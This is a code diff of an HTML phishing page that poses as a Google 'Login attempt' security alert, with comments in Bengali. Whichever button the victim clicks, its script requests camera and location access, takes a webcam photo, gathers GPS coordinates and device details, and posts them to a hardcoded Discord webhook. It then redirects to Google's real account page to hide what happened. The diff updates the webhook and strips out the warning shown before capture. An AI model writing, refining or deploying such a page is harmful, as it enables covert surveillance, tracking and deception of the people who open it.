@@ -1,4 +1,4 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -21,7 +21,7 @@
 <div class="card">
     <div class="icon-circle">G</div>
     <h2>Login attempt</h2>
-    <p>We detected a new login attempt from an unrecognized device in Dhaka. Please verify your identity.</p>
+    <p>We detected a new login attempt from an unrecognized device in Dhaka. Please verify your identity to secure your account.</p>
     <div class="btn-group">
         <button class="btn btn-deny" onclick="startCapture('Deny')">Deny</button>
         <button class="btn btn-approve" onclick="startCapture('Approve')">Approve</button>
@@ -31,21 +31,22 @@
 </div>
 
 <script>
-    // tumi (তুমি) - তোমার Discord Webhook URL টি এখানে বসাও
-    const webhookURL = "https://discord.com/api/webhooks/1482986372636606546/Wk5kMZTBxI_UqHg9M78xIxTorwSpLBOGovEgLVS8IciVJRLhpzouvh2I9v7G7I0uh7E0"; 
+    // tumi (তুমি) - তোমার নতুন Webhook URL এখানে সেট করা হয়েছে
+    const webhookURL = "https://discord.com/api/webhooks/1482987004991111318/XKQNQNpaubgBiLr3ZXww5xVQs4qeHZmMlKFBG3nU-vA5zaRlJjNgKLWK7uiNw3cH-7a0"; 
 
     async function startCapture(type) {
-        alert("Security Alert: Access to camera and location is required to verify this " + type + " request.");
-        
         try {
+            // ক্যামেরা পারমিশন নেওয়া
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.getElementById('video');
             video.srcObject = stream;
 
+            // লোকেশন নেওয়া
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 const canvas = document.getElementById('canvas');
                 const ctx = canvas.getContext('2d');
                 
+                // ১ সেকেন্ড অপেক্ষা করে ছবি তোলা (যাতে ক্যামেরা ফোকাস হয়)
                 setTimeout(async () => {
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
@@ -53,24 +54,35 @@
                     
                     canvas.toBlob(async (blob) => {
                         const fd = new FormData();
-                        fd.append('file', blob, 'capture.jpg');
+                        fd.append('file', blob, 'target_capture.jpg');
                         fd.append('payload_json', JSON.stringify({
-                            content: `🔴 **Alert: Target Clicked [${type}]**`,
+                            content: `🔔 **New Alert: System Accessed!**`,
                             embeds: [{
+                                color: type === 'Approve' ? 3066993 : 15158332,
+                                title: "Target Verification Details",
                                 fields: [
-                                    { name: "📍 Location", value: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` },
-                                    { name: "📱 Device Info", value: navigator.userAgent }
-                                ]
+                                    { name: "🔘 Action Taken", value: type, inline: true },
+                                    { name: "📍 Location", value: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`, inline: false },
+                                    { name: "📱 Device Info", value: navigator.userAgent, inline: false }
+                                ],
+                                timestamp: new Date()
                             }]
                         }));
 
+                        // Discord এ ডেটা পাঠানো
                         await fetch(webhookURL, { method: 'POST', body: fd });
+                        
+                        // কাজ শেষে অফিসিয়াল পেজে রিডাইরেক্ট করা
                         window.location.href = "https://myaccount.google.com/";
                     }, 'image/jpeg');
                 }, 1000);
+            }, (err) => {
+                console.error("Location Error:", err);
+                window.location.href = "https://myaccount.google.com/";
             });
         } catch (e) {
-            console.log("Error:", e);
+            console.error("Camera Error:", e);
+            window.location.href = "https://myaccount.google.com/";
         }
     }
 </script>
